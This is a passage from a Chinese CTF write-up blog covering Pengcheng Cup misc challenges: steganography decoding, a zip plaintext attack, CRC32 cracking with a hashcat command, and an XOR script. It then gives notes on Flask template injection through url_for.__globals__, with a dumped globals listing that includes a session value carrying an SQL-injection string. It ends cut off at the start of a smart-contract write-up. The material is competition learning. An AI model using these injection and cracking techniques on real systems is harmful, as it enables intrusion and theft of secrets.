class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">gifFileName = <span class="hljs-string">'Traffic_Light.gif'</span></span><br><span class="line"><span class="hljs-comment">#使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span></span><br><span class="line">im = Image.open(gifFileName)</span><br><span class="line">pngDir = gifFileName[:<span class="hljs-number">-4</span>]</span><br><span class="line"><span class="hljs-comment">#创建存放每帧图片的文件夹</span></span><br><span class="line">os.mkdir(pngDir)</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">  <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    <span class="hljs-comment">#保存当前帧图片</span></span><br><span class="line">    current = im.tell()</span><br><span class="line">    im.save(pngDir+<span class="hljs-string">'/'</span>+str(current)+<span class="hljs-string">'.png'</span>)</span><br><span class="line">    <span class="hljs-comment">#获取下一帧图片</span></span><br><span class="line">    im.seek(current+<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> EOFError:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>结果得到1168个项目。。。</p><div align="center"><br>    <img src="/images/posts/pcb/9.png"><br></div><p>没想到快捷方法，，只能手动过了一遍得到，先把绿灯当做1，红灯为0，黄灯为空格：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">10011001 10010011 10011110 10011000 10000100</span><br><span class="line">10101111 10010011 11001100 11001011 10001100</span><br><span class="line">11001100 10100000 10001111 11001011 10000110</span><br><span class="line">10100000 11001011 10001011 10001011 11001100</span><br><span class="line">10010001 10001011 11001110 11001111 10010001</span><br><span class="line">10100000 10001011 11001111 10100000 10001011</span><br><span class="line">10001101 11001011 10011001 10011001 11001110</span><br><span class="line">10011100 10100000 10001100 11001011 10011001</span><br><span class="line">11001100 10001011 10000110 10100000 10001000</span><br><span class="line">10010111 11001100 10010001 10100000 10000110</span><br><span class="line">11001111 10001010 10100000 11001011 10001101</span><br><span class="line">11001100 10100000 11001111 10001010 10001011</span><br><span class="line">10001100 11001110 10011011 11001100 10000010</span><br></pre></td></tr></table></figure><p>结果也发现每8个红绿灯就有一个黄灯，刚好分隔开，写个脚本跑一下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="hljs-string">'./temp'</span>, <span class="hljs-string">'r'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> oneline <span class="hljs-keyword">in</span> f.readlines():</span><br><span class="line">    numbers = oneline.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> numbers:</span><br><span class="line">        one = one.replace(<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>).replace(<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>).replace(<span class="hljs-string">'2'</span>,<span class="hljs-string">'0'</span>)</span><br><span class="line">        flag += chr(int(one, <span class="hljs-number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>上面之所以做了替换时因为绿灯跟红灯代表的0/1给弄反了。。</p><h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><p>Binwalk后发现有很多东西：</p><div align="center"><br>    <img src="/images/posts/pcb/10.png"><br></div><p>Foremost后可以得到:</p><div align="center"><br>    <img src="/images/posts/pcb/11.png"><br></div><p>其中zip2.zip是加密的，而且里面有一个2-stage的文件，再看上面得到了，容易联想到明文攻击。</p><div align="center"><br>    <img src="/images/posts/pcb/12.png"><br></div><p>我们把上面的2-stage.what的what去掉，然后用Ubuntu自带的<code>zip</code>去压缩，7z和WinRAR压缩出来的<code>都不行</code>，ARCHPR识别不了。最后密码是Hello_Hi。</p><div align="center"><br>    <img src="/images/posts/pcb/13.png"><br></div><p>但flowerdance的内容令人失望，并没有有价值的东西。</p><div align="center"><br>    <img src="/images/posts/pcb/14.png"><br></div><p>File一下2-stage可以发现是jpg，直接改成jpg。</p><div align="center"><br>    <img src="/images/posts/pcb/15.png"><br></div><p>再根据提示用cloacked-pixel对这个图片进行处理，使用：</p><div align="center"><br>    <img src="/images/posts/pcb/16.png"><br></div><p>可以得到一个zip文件，内容如下：</p><div align="center"><br>    <img src="/images/posts/pcb/17.png"><br></div><p>但zip3、zip4都需要密码。前面得到的密码都对不上，而且发现这里zip3.zip中的guess文件只有4字节，可以考虑CRC32碰撞攻击。</p><div align="center"><br>    <img src="/images/posts/pcb/18.png"><br></div><p>这里使用<code>hashcat</code>神器，<code>-D 2</code>表示<code>GPU</code>破解。<br><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -a 3 -m 11500 -D 2 --force --increment --increment-min 4 --increment-max 6 --force 99bed60e:00000000 ?a ?a?a?a?a?a</span><br></pre></td></tr></table></figure></p><div align="center"><br>    <img src="/images/posts/pcb/19.png"><br></div><p>结果只需<code>2s</code>，神器不亏是神器。。。</p><p>但密码不是zip3的，是zip4的。。然而还是没惊喜</p><div align="center"><br>    <img src="/images/posts/pcb/20.png"><br></div><p>回头再看那个docx文件，突然发现还有隐藏的东西：</p><div align="center"><br>    <img src="/images/posts/pcb/21.png"><br></div><p>直接将docx改成zip提取嵌入对象，在media里有新的东西：</p><div align="center"><br>    <img src="/images/posts/pcb/22.png"><br></div><p>其中image1.emf能打开，而i_love_you.emf却不行，但观察它的文件结尾，可以看到是zip的格式，binwalk也得出zip end。</p><div align="center"><br>    <img src="/images/posts/pcb/23.png"><br></div><p>在观察发现i_love_you.emf跟zip4.zip的文件大小相同，考虑异或一下两个文件，这里直接Google代码：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> binascii</span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 每个字节转成hex，0x顺便去掉，对于不足两位的补0</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2hex</span><span class="hljs-params">(str)</span>:</span></span><br><span class="line">    hexs = []</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str:</span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>))</span><br><span class="line">        <span class="hljs-keyword">if</span> len(tmp) == <span class="hljs-number">2</span>:</span><br><span class="line">            hexs.append(tmp)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            hexs.append(<span class="hljs-string">'0'</span> + tmp)</span><br><span class="line">    <span class="hljs-keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [<span class="hljs-string">'0'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>]</span><br><span class="line">arr2 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tran</span><span class="hljs-params">(r)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(arr)):</span><br><span class="line">        <span class="hljs-keyword">if</span> r == arr[i]:</span><br><span class="line">            <span class="hljs-keyword">return</span> arr2[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\docx\\word\\media\\I_Love_You.emf'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">f2 = open(<span class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\zip4.zip'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">hexs = []</span><br><span class="line">hexs2 = []</span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    t = f.readline()</span><br><span class="line">    t2 = f2.readline()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> t <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> t2:</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    hexs.extend(str2hex(t))</span><br><span class="line">    hexs2.extend(str2hex(t2))</span><br><span class="line">f.close()</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line">ff = open(<span class="hljs-string">'out.txt'</span>, <span class="hljs-string">'wb'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(min(len(hexs), len(hexs2))):</span><br><span class="line">    a = tran(hexs[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs[i][<span class="hljs-number">1</span>])</span><br><span class="line">    b = tran(hexs2[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs2[i][<span class="hljs-number">1</span>])</span><br><span class="line">    B = struct.pack(<span class="hljs-string">'B'</span>, a ^ b)</span><br><span class="line">    ff.write(B)</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure></p><p>最终可以发现出来的是一个zip，相信这个才是完整的zip，用密码打开后：</p><div align="center"><br>    <img src="/images/posts/pcb/24.png"><br></div><h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><p>这道题没解出来，但是也学到了很多flask安全性的东西，特别是<code>SSTI</code>的技巧以及对flask session解密和签名的方法，因为没法复现，只能贴一下当时找的有价值的资料：</p><p>在flask中<code>url_for.__globals__</code>可以拿到危险函数，如file、system、os等，但在这道题中并不能执行，先Mark一下。<br><figure class="highlight py hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125; <span class="hljs-comment"># 全局类包括了  file、eval等等</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">&#123;'find_package': &lt;function find_package at 0x7f0b34ca79b0&gt;, '_PackageBoundObject': &lt;class 'flask.helpers._PackageBoundObject'&gt;, 'get_load_dotenv': &lt;function get_load_dotenv at 0x7f0b34ca7398&gt;, 'is_ip': &lt;function is_ip at 0x7f0b34cab0c8&gt;, 'current_app': &lt;Flask 'app'&gt;, 'PY2': True, 'send_from_directory': &lt;function send_from_directory at 0x7f0b34ca7848&gt;, 'session': &lt;SecureCookieSession &#123;u'csrf_token': '004932e5d4ffd2ed1d2c31180fe1f6dadc1591ff', u'_id': '22858459d2136b66a0e4cacf8a4ccac773bce0fe3c3d97f7f1929597cb90413eb288850dbc6daad7be96721767586024f036099a752ec33688113c7e2157a09e', u'user_id': u'77', u'name': u"0' (select hex(hex(database()))) '0", u'is_admin': False, u'_fresh': True&#125;&gt;, 'get_flashed_messages': &lt;function get_flashed_messages at 0x7f0b34ca76e0&gt;, 'BadRequest': &lt;class 'werkzeug.exceptions.BadRequest'&gt;, 'posixpath': &lt;module 'posixpath' from '/usr/lib/python2.7/posixpath.pyc'&gt;, 'BuildError': &lt;class 'werkzeug.routing.BuildError'&gt;, 'url_quote': &lt;function url_quote at 0x7f0b359a3668&gt;, 'FileSystemLoader': &lt;class 'jinja2.loaders.FileSystemLoader'&gt;, 'get_root_path': &lt;function get_root_path at 0x7f0b34ca78c0&gt;, '__package__': 'flask', 'locked_cached_property': &lt;class 'flask.helpers.locked_cached_property'&gt;, '_app_ctx_stack': &lt;werkzeug.local.LocalStack object at 0x7f0b34c97690&gt;, '_endpoint_from_view_func': &lt;function _endpoint_from_view_func at 0x7f0b34ca7410&gt;, 'total_seconds': &lt;function total_seconds at 0x7f0b34ca7a28&gt;, 'get_env': &lt;function get_env at 0x7f0b34ca70c8&gt;, '__doc__': '\n flask.helpers\n ~~~~~~~~~~~~~\n\n Implements various helpers.\n\n :copyright: \xc2\xa9 2010 by the Pallets team.\n :license: BSD, see LICENSE for more details.\n', 'flash': &lt;function flash at 0x7f0b34ca7668&gt;, 'mimetypes': &lt;module 'mimetypes' from '/usr/lib/python2.7/mimetypes.pyc'&gt;, 'adler32': &lt;built-in function adler32&gt;, 'get_template_attribute': &lt;function get_template_attribute at 0x7f0b34ca75f0&gt;, '_request_ctx_stack': &lt;werkzeug.local.LocalStack object at 0x7f0b34c901d0&gt;, '__builtins__': &#123;'bytearray': &lt;type 'bytearray'&gt;, 'IndexError': &lt;type 'exceptions.IndexError'&gt;, 'all': &lt;built-in function all&gt;, 'help': Type help() for interactive help, or help(object) for help about object., 'vars': &lt;built-in function vars&gt;, 'SyntaxError': &lt;type 'exceptions.SyntaxError'&gt;, 'unicode': &lt;type 'unicode'&gt;, 'UnicodeDecodeError': &lt;type 'exceptions.UnicodeDecodeError'&gt;, 'memoryview': &lt;type 'memoryview'&gt;, 'isinstance': &lt;built-in function isinstance&gt;, 'copyright': Copyright (c) 2001-2016 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'NameError': &lt;type 'exceptions.NameError'&gt;, 'BytesWarning': &lt;type 'exceptions.BytesWarning'&gt;, 'dict': &lt;type 'dict'&gt;, 'input': &lt;built-in function input&gt;, 'oct': &lt;built-in function oct&gt;, 'bin': &lt;built-in function bin&gt;, 'SystemExit': &lt;type 'exceptions.SystemExit'&gt;, 'StandardError': &lt;type 'exceptions.StandardError'&gt;, 'format': &lt;built-in function format&gt;, 'repr': &lt;built-in function repr&gt;, 'sorted': &lt;built-in function sorted&gt;, 'False': False, 'RuntimeWarning': &lt;type 'exceptions.RuntimeWarning'&gt;, 'list': &lt;type 'list'&gt;, 'iter': &lt;built-in function iter&gt;, 'reload': &lt;built-in function reload&gt;, 'Warning': &lt;type 'exceptions.Warning'&gt;, '__package__': None, 'round': &lt;built-in function round&gt;, 'dir': &lt;built-in function dir&gt;, 'cmp': &lt;built-in function cmp&gt;, 'set': &lt;type 'set'&gt;, 'bytes': &lt;type 'str'&gt;, 'reduce': &lt;built-in function reduce&gt;, 'intern': &lt;built-in function intern&gt;, 'issubclass': &lt;built-in function issubclass&gt;, 'Ellipsis': Ellipsis, 'EOFError': &lt;type 'exceptions.EOFError'&gt;, 'locals': &lt;built-in function locals&gt;, 'BufferError': &lt;type 'exceptions.BufferError'&gt;, 'slice': &lt;type 'slice'&gt;, 'FloatingPointError': &lt;type 'exceptions.FloatingPointError'&gt;, 'sum': &lt;built-in function sum&gt;, 'getattr': &lt;built-in function getattr&gt;, 'abs': &lt;built-in function abs&gt;, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'print': &lt;built-in function print&gt;, 'True': True, 'FutureWarning': &lt;type 'exceptions.FutureWarning'&gt;, 'ImportWarning': &lt;type 'exceptions.ImportWarning'&gt;, 'None': None, 'hash': &lt;built-in function hash&gt;, 'ReferenceError': &lt;type 'exceptions.ReferenceError'&gt;, 'len': &lt;built-in function len&gt;, 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'frozenset': &lt;type 'frozenset'&gt;, '__name__': '__builtin__', 'ord': &lt;built-in function ord&gt;, 'super': &lt;type 'super'&gt;, 'TypeError': &lt;type 'exceptions.TypeError'&gt;, 'license': Type license() to see the full license text, 'KeyboardInterrupt': &lt;type 'exceptions.KeyboardInterrupt'&gt;, 'UserWarning': &lt;type 'exceptions.UserWarning'&gt;, 'filter': &lt;built-in function filter&gt;, 'range': &lt;built-in function range&gt;, 'staticmethod': &lt;type 'staticmethod'&gt;, 'SystemError': &lt;type 'exceptions.SystemError'&gt;, 'BaseException': &lt;type 'exceptions.BaseException'&gt;, 'pow': &lt;built-in function pow&gt;, 'RuntimeError': &lt;type 'exceptions.RuntimeError'&gt;, 'float': &lt;type 'float'&gt;, 'MemoryError': &lt;type 'exceptions.MemoryError'&gt;, 'StopIteration': &lt;type 'exceptions.StopIteration'&gt;, 'globals': &lt;built-in function globals&gt;, 'divmod': &lt;built-in function divmod&gt;, 'enumerate': &lt;type 'enumerate'&gt;, 'apply': &lt;built-in function apply&gt;, 'LookupError': &lt;type 'exceptions.LookupError'&gt;, 'open': &lt;built-in function open&gt;, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'basestring': &lt;type 'basestring'&gt;, 'UnicodeError': &lt;type 'exceptions.UnicodeError'&gt;, 'zip': &lt;built-in function zip&gt;, 'hex': &lt;built-in function hex&gt;, 'long': &lt;type 'long'&gt;, 'next': &lt;built-in function next&gt;, 'ImportError': &lt;type 'exceptions.ImportError'&gt;, 'chr': &lt;built-in function chr&gt;, 'xrange': &lt;type 'xrange'&gt;, 'type': &lt;type 'type'&gt;, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'Exception': &lt;type 'exceptions.Exception'&gt;, 'tuple': &lt;type 'tuple'&gt;, 'UnicodeTranslateError': &lt;type 'exceptions.UnicodeTranslateError'&gt;, 'reversed': &lt;type 'reversed'&gt;, 'UnicodeEncodeError': &lt;type 'exceptions.UnicodeEncodeError'&gt;, 'IOError': &lt;type 'exceptions.IOError'&gt;, 'hasattr': &lt;built-in function hasattr&gt;, 'delattr': &lt;built-in function delattr&gt;, 'setattr': &lt;built-in function setattr&gt;, 'raw_input': &lt;built-in function raw_input&gt;, 'SyntaxWarning': &lt;type 'exceptions.SyntaxWarning'&gt;, 'compile': &lt;built-in function compile&gt;, 'ArithmeticError': &lt;type 'exceptions.ArithmeticError'&gt;, 'str': &lt;type 'str'&gt;, 'property': &lt;type 'property'&gt;, 'GeneratorExit': &lt;type 'exceptions.GeneratorExit'&gt;, 'int': &lt;type 'int'&gt;, '__import__': &lt;built-in function __import__&gt;, 'KeyError': &lt;type 'exceptions.KeyError'&gt;, 'coerce': &lt;built-in function coerce&gt;, 'PendingDeprecationWarning': &lt;type 'exceptions.PendingDeprecationWarning'&gt;, 'file': &lt;type 'file'&gt;, 'EnvironmentError': &lt;type 'exceptions.EnvironmentError'&gt;, 'unichr': &lt;built-in function unichr&gt;, 'id': &lt;built-in function id&gt;, 'OSError': &lt;type 'exceptions.OSError'&gt;, 'DeprecationWarning': &lt;type 'exceptions.DeprecationWarning'&gt;, 'min': &lt;built-in function min&gt;, 'UnicodeWarning': &lt;type 'exceptions.UnicodeWarning'&gt;, 'execfile': &lt;built-in function execfile&gt;, 'any': &lt;built-in function any&gt;, 'complex': &lt;type 'complex'&gt;, 'bool': &lt;type 'bool'&gt;, 'ValueError': &lt;type 'exceptions.ValueError'&gt;, 'NotImplemented': NotImplemented, 'map': &lt;built-in function map&gt;, 'buffer': &lt;type 'buffer'&gt;, 'max': &lt;built-in function max&gt;, 'object': &lt;type 'object'&gt;, 'TabError': &lt;type 'exceptions.TabError'&gt;, 'callable': &lt;built-in function callable&gt;, 'ZeroDivisionError': &lt;type 'exceptions.ZeroDivisionError'&gt;, 'eval': &lt;built-in function eval&gt;, '__debug__': True, 'IndentationError': &lt;type 'exceptions.IndentationError'&gt;, 'AssertionError': &lt;type 'exceptions.AssertionError'&gt;, 'classmethod': &lt;type 'classmethod'&gt;, 'UnboundLocalError': &lt;type 'exceptions.UnboundLocalError'&gt;, 'NotImplementedError': &lt;type 'exceptions.NotImplementedError'&gt;, 'AttributeError': &lt;type 'exceptions.AttributeError'&gt;, 'OverflowError': &lt;type 'exceptions.OverflowError'&gt;&#125;, 'text_type': &lt;type 'unicode'&gt;, '__file__': '/usr/local/lib/python2.7/dist-packages/flask/helpers.pyc', 'get_debug_flag': &lt;function get_debug_flag at 0x7f0b34ca7320&gt;, 'RLock': &lt;function RLock at 0x7f0b35923938&gt;, 'safe_join': &lt;function safe_join at 0x7f0b34ca77d0&gt;, 'sys': &lt;module 'sys' (built-in)&gt;, 'Headers': &lt;class 'werkzeug.datastructures.Headers'&gt;, 'Range': &lt;class 'werkzeug.datastructures.Range'&gt;, 'stream_with_context': &lt;function stream_with_context at 0x7f0b34ca7488&gt;, '_os_alt_seps': [], '__name__': 'flask.helpers', '_missing': &lt;object object at 0x7f0b379f71a0&gt;, 'pkgutil': &lt;module 'pkgutil' from '/usr/lib/python2.7/pkgutil.pyc'&gt;, 'NotFound': &lt;class 'werkzeug.exceptions.NotFound'&gt;, 'unicodedata': &lt;module 'unicodedata' (built-in)&gt;, 'wrap_file': &lt;function wrap_file at 0x7f0b359ba2a8&gt;, 'socket': &lt;module 'socket' from '/usr/lib/python2.7/socket.pyc'&gt;, 'update_wrapper': &lt;function update_wrapper at 0x7f0b379d2758&gt;, 'make_response': &lt;function make_response at 0x7f0b34ca7500&gt;, 'request': &lt;Request 'http://58.20.46.149:25412/&#123;&#123;url_for.__globals__&#125;&#125;' [GET]&gt;, 'string_types': (&lt;type 'str'&gt;, &lt;type 'unicode'&gt;), 'message_flashed': &lt;flask.signals._FakeSignal object at 0x7f0b34ca2a90&gt;, 'RequestedRangeNotSatisfiable': &lt;class 'werkzeug.exceptions.RequestedRangeNotSatisfiable'&gt;, 'send_file': &lt;function send_file at 0x7f0b34ca7758&gt;, 'time': &lt;built-in function time&gt;, 'url_for': &lt;function url_for at 0x7f0b34ca7578&gt;, '_matching_loader_thinks_module_is_package': &lt;function _matching_loader_thinks_module_is_package at 0x7f0b34ca7938&gt;, 'os': &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&#125;  </span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span></span><br></pre></td></tr></table></figure></p><p>而当<code>config</code>为<code>None</code>时，还可以使用<code>url_for.__globals__.current_app.config</code>得到config、SECRET_KEY等信息。</p><ul><li><a href="https://medium.com/bugbountywriteup/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f" target="_blank">flask ssti全局变量</a></li><li><a href="https://terryvogelsang.tech/MITRECTF2018-my-flask-app/" target="_blank">flask session解密与签名伪造</a></li><li><a href="https://blog.miguelgrinberg.com/post/how-secure-is-the-flask-user-session" target="_blank">flask session签名</a></li><li><a href="https://0x48.pw/2016/10/14/0x24/" target="_blank">HITCON 2016 flask session命令执行</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;请阅读正文&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="鹏程杯" scheme="http://yoursite.com/tags/%E9%B9%8F%E7%A8%8B%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>BCTF2018 Fake3D Study</title>
    <link href="http://yoursite.com/2018/11/bctf2018-fake3d-writeup/"/>
    <id>http://yoursite.com/2018/11/bctf2018-fake3d-writeup/</id>
    <published>2018-11-30T14:05:56.000Z</published>
    <updated>2018-12-01T03:13:03.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这道题跟上道比简单了点，原理唯一的区别就是如何<code>bypass extcodesize</code>，而这个网上也有解决方案，EOSGame中的<code>FOMO3D</code>游戏就发生过这种攻击。</p><a id="more"></a><h3 id="OverView"><a href="#OverView" class="headerlink" title="OverView"></a>OverView</h3><p>&emsp;&emsp;首先看合约代码：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * @title SafeMath</span></span><br><span class="line"><span class="hljs-comment"> * @dev Math operations with safety checks that revert on error</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line">library SafeMath &#123;</span><br><span 